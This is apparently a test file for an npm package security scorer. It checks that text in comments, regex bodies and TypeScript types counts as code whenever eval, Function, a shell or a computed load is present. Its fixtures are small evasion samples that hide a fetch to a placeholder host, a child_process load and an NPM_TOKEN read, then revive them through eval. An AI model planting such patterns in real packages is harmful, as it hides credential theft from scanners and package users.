// Text the floor leaves out (comments, regex bodies, TypeScript that emits nothing) becomes code only through an
// evaluator: `String(fn)` keeps a function's comments, `re.source` returns a regex body, a file can read itself. So
// apm-score-v8 leaves that text out only while no eval, Function, vm, shell or computed-load finding stands in the
// package; once one does, it reads the text with apm-score-v3's rules too. Every program here is inert: it names
// example.invalid, child_process and a token, and scoring runs nothing.
import { describe, expect, test } from "bun:test";
import vm from "node:vm";
import { analyze, finalize, TEXT_MATCH_RUN, type ScoreReport, type TarEntry } from "../src/index.ts";
import { analyze as analyzeV3, finalize as finalizeV3 } from "./v3/score.ts";

const STATE = { publishedAt: 0, now: 1e13, deprecated: null, status: "active", statusReason: null } as const;

function entry(path: string, text: string): TarEntry {
  const data = new TextEncoder().encode(text);

  return { path, size: data.length, mode: 0o644, data };
}

function input(file: string, src: string, extra: Record<string, string> = {}) {
  const manifest = { name: "probe-pkg", version: "1.0.0", license: "MIT", main: file };

  return { name: "probe-pkg", manifest, files: [entry("package.json", JSON.stringify(manifest)), entry(file, src), ...Object.entries(extra).map(([p, t]) => entry(p, t))], publisher: "a", previousPublishers: [] };
}

function v8(file: string, src: string, extra?: Record<string, string>): ScoreReport {
  return finalize(analyze(input(file, src, extra)), STATE);
}

function v3(file: string, src: string, extra?: Record<string, string>): number {
  return finalizeV3(analyzeV3(input(file, src, extra)), STATE).score;
}

/** Runs `src` in a node:vm context whose fetch, process and module loading only record what they are asked for. */
function trace(src: string, self?: string): string[] {
  const calls: string[] = [];
  const env = new Proxy({}, { get: (_t, k) => (calls.push(`env:${String(k)}`), undefined) });
  const process = { env, getBuiltinModule: (m: string) => (calls.push(`module:${m}`), {}) };
  const fetch = (u: string) => (calls.push(`fetch:${u}`), Promise.resolve());
  const require = (m: string) => (m === "fs" ? { readFileSync: () => self ?? src } : (calls.push(`module:${m}`), {}));

  vm.runInContext(src, vm.createContext({ process, fetch, require, __filename: "index.js" }), { timeout: 1000 });

  return calls;
}

// The residual script's shapes (the v8 review's known gap), the regex `.source` variants, and two more routes the
// same rule closes: a TypeScript type read back from the file, and a file that reads its own comment.
const FIXTURES: readonly { name: string; file: string; src: string; v3: number; runs: readonly string[] }[] = [
  {
    name: "comment-function-source-fetch",
    file: "index.js",
    src: "function f(){/* fetch('https://example.invalid') */}\neval(String(f).slice(15,-3));\n",
    v3: 80,
    runs: ["fetch:https://example.invalid"],
  },
  {
    name: "comment-function-source-full",
    file: "index.js",
    src: "function f(){/* process.getBuiltinModule('child_process');fetch('https://example.invalid');process.env.NPM_TOKEN */}\neval(String(f).slice(15,-3));\n",
    v3: 40,
    runs: ["module:child_process", "fetch:https://example.invalid", "env:NPM_TOKEN"],
  },
  {
    name: "regex-source",
    file: "index.js",
    src: "const r = /fetch('https:\\/\\/example.invalid')/;\neval(r.source);\n",
    v3: 80,
    runs: ["fetch:https://example.invalid"],
  },
  {
    name: "regex-source-unescaped",
    file: "index.js",
    src: "const r = /fetch('https:\\/\\/example.invalid')/;\nconst s = r.source;\neval(s.replace(/\\\\/g, ''));\n",
    v3: 80,
    runs: ["fetch:https://example.invalid"],
  },
  {
    name: "regex-source-function",
    file: "index.js",
    src: "const r = /process.getBuiltinModule('child_process')/;\nnew Function(r.source)();\n",
    v3: 75,
    runs: ["module:child_process"],
  },
  {
    name: "self-read-comment",
    file: "index.js",
    src: "/*P fetch('https://example.invalid') P*/\neval(require('fs').readFileSync(__filename, 'utf8').split('/*P')[1].split('P*/')[0]);\n",
    v3: 80,
    runs: ["fetch:https://example.invalid"],
  },
  {
    name: "self-read-type",
    file: "index.ts",
    src: "type T = \"process.getBuiltinModule('child_process')\";\neval(require('fs').readFileSync(__filename, 'utf8').split('\"')[1]);\n",
    v3: 75,
    runs: [],
  },
];

describe("excluded text counts while an evaluator stands", () => {
  for (const f of FIXTURES) {
    test(`${f.name}: at or below apm-score-v3`, () => {
      expect(v3(f.file, f.src)).toBe(f.v3);
      expect(v8(f.file, f.src).score).toBeLessThanOrEqual(f.v3);
    });

    if (f.runs.length > 0) {
      test(`${f.name}: runs its payload (liveness)`, () => {
        expect(trace(f.src)).toEqual(expect.arrayContaining([...f.runs]));
      });
    }
  }

  test("the evidence says why a comment counts", () => {
    const r = v8("index.js", FIXTURES[0]?.src ?? "");
    const network = r.signals.find((s) => s.id === "network");

    expect(network?.confidence).toBe("confirmed");
    expect(network?.evidence.some((e) => e.endsWith(TEXT_MATCH_RUN))).toBe(true);
  });

  test("an evaluator in another file of the package counts too", () => {
    const src = "function f(){/* fetch('https://example.invalid') */}\nmodule.exports = String(f);\n";
    const extra = { "run.js": "eval(require('./index.js').slice(15,-3));\n" };

    expect(v8("index.js", src, extra).score).toBeLessThanOrEqual(v3("index.js", src, extra));
    expect(v8("index.js", src, extra).signals.some((s) => s.id === "network")).toBe(true);
  });

  test("a shell or a computed load is enough", () => {
    const comment = "// fetch('https://example.invalid')\n";

    for (const code of ["require('child_process');\n", "require(process.argv[2]);\n"]) {
      expect(v8("index.js", comment + code).signals.some((s) => s.id === "network")).toBe(true);
    }
  });
});

describe("with no evaluator, comments, regex bodies and types stay out", () => {
  test("a comment that names fetch", () => {
    const src = "// fetch('https://example.invalid') is how the README calls it\nmodule.exports = (x) => x + 1;\n";

    expect(v3("index.js", src)).toBe(90);
    expect(v8("index.js", src).score).toBe(100);
  });

  test("a regex body with a pipe to sh", () => {
    const src = "module.exports = /a|sh|b/.test('x');\n";

    expect(v8("index.js", src).signals.some((s) => s.id === "shell-exec")).toBe(false);
  });

  test("a TypeScript type that names a credential file", () => {
    const src = "export type Paths = '.npmrc' | '.ssh';\nexport const n = 1;\n";

    expect(v8("index.ts", src).signals.some((s) => s.id === "credential-access")).toBe(false);
  });
});
